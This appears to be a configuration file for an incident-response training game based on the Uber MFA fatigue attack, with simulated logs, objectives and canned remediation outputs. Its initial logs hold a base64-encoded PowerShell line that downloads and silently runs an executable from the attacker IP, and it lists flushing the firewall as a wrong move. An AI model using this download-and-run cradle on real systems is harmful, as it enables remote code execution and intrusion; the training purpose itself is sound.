title: Uber MFA Fatigue Attack
storyIntro: An attacker is spamming a corporate contractor with persistent Duo MFA push notifications while messaging them on WhatsApp pretending to be IT Support. The contractor eventually approves the login, granting the attacker full VPN session foothold and access to internal jump hosts.
brief: An active intruder is spamming a contractor with Duo MFA push alerts. Forensics indicates a VPN gateway breach from an anomalous host IP.
objectives: Revoke active VPN sessions from the foreign host IP
Enforce strict MFA number-matching security policies
initialLogs: [WARNING] 52 duplicate MFA push notifications sent to contractor.user

[CRITICAL] Successful VPN gateway login established from host IP 185.143.223.41. Powershell payload: JHN5cyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7ICRzeXMuRG93bmxvYWRGaWxlKCdodHRwOi8vMTg1LjE0My4yMjMuNDEvcGF5bG9hZC5leGUnLCAnJGVudjpURU1QL3N5cy5leGUnKTsgU3RhcnQtUHJvY2VzcygnJGVudjpURU1QL3N5cy5leGUnKSAtV2luZG93U3R5bGUgSGlkZGVuOw==
[ERROR] Thycotic PAM API logs show unencrypted credential access requests

agents.name: Manager
agents.message: We have an active breach. Someone is posting offensive screenshots on Slack using a provisioned 'IT_SUPPORT' admin account!

agents.name: Teammate
agents.message: They got into the PAM secrets manager. We must rotate the admin credentials and terminate the contractor VPN tunnel immediately.

winCondition: Contractor VPN session terminated, Duo matching policy enforced, and admin credentials rotated.
loseCondition: Attacker successfully exfiltrates the complete corporate customer database.
evolving_logs: [CRITICAL] AWS CloudTrail shows unauthorized API console access from IP 185.143.223.41.
[ALERT] Abnormal PowerShell execution tracing detected on jump box admin hosts.
[EMERGENCY] Thycotic API telemetry flags active database dump sequences.
[WARNING] Compromised contractor credentials attempted to access secondary subnet routing.

incorrect_action_consequences.iptables -F: All firewall isolation rules flushed. Attacker gains immediate lateral access to secondary production subnets.
incorrect_action_consequences.thycotic-cli credentials list --unencryp: All active password logs printed directly to an attacker-monitored shell.

Teammate.focus: VPN session logs and Duo matching policies

vpn-session-manager terminate --user con.output:
VPN SESSION TERMINATED: Tunnel closed for user contractor.user@uber.com.
TELEMETRY: Active connections: 0. IP 185.143.223.41 blocked.
vpn-session-manager terminate --user con.advisor: [ALERT] IAM Lead: Excellent, contractor VPN connection has been killed. The attacker's live terminal session is severed.

duo-policy update --policy-id mfa_defaul.output:
DUO MFA POLICY UPDATE: Enforced number-matching requirement on all push notifications.
STATUS: Active across production-gateway nodes.
duo-policy update --policy-id mfa_defaul.advisor: [ALERT] IAM Lead: Number-matching policy is live. The contractor cannot blindly click 'Approve' anymore without matching numbers.

thycotic-cli credentials rotate --id pam.output:
THYCOTIC PAM SECURITY: Rotation completed.
STATUS: Secret 'pam_admin_creds' updated to 32-character high-entropy hash.
thycotic-cli credentials rotate --id pam.advisor: [ALERT] IT Director: Excellent rotation. The attacker's access keys to the PAM manager have been completely invalidated.

vpn-session-manager list-active.output:
ACTIVE CONNECTIONS SUMMARY:
USER                IP              SUBNET           DURATION
contractor.user   185.143.223.41   10.120.4.15      00:47:22
admin.sec         10.42.0.12       10.120.2.11      02:14:05
vpn-session-manager list-active.advisor: Identity analysis: Session 'contractor.user' is anomalous. IP originates from external region.

duo-auth logs --user contractor.user.output:
DUO TELEMETRY TIMELINE FOR contractor.user:
14:22:47 | Push Sent | Denied
14:22:49 | Push Sent | Denied
14:22:51 | Push Sent | Denied
14:23:01 | Push Sent | Approved (User approved lock bypass)
duo-auth logs --user contractor.user.advisor: MFA fatigue trace confirmed: Contractor approved push after continuous prompts.
